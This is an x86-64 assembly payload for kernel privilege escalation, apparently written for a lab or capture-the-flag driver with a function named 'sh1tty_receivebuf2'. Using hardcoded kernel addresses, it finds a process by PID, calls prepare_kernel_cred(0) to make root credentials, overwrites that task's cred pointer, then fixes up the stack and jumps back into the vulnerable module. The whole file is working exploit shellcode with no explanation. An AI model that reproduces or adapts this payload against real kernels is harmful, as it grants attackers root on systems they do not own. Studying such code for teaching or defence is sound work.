.intel_syntax noprefix

.text
.global _start

_start:
	nop
	push pid
	pop rdi
	mov r14, 0xffffffff8105e2c0
	call r14 # find_get_pid

	mov rdi, rax
	xor rsi, rsi
	mov r14, 0xffffffff8105e280
	call r14 # get_pid_task

	xor rdi, rdi
	mov r10, rax # r10 = task_struct*

	mov r14, 0xffffffff810623b0
	call r14 # creds = prepare_kernel_cred(0)

	add r10, 0x570 # offset task->cred
	mov [r10], rax # task->cred = creds

	# Restore stack context
	xor rax, rax
	inc rax
	add rsp, 88
	mov r15, [rsp+72]

	# Jump at sh1tty_receivebuf2's end
	mov r14, 0xffffffffa0000570
	jmp r14
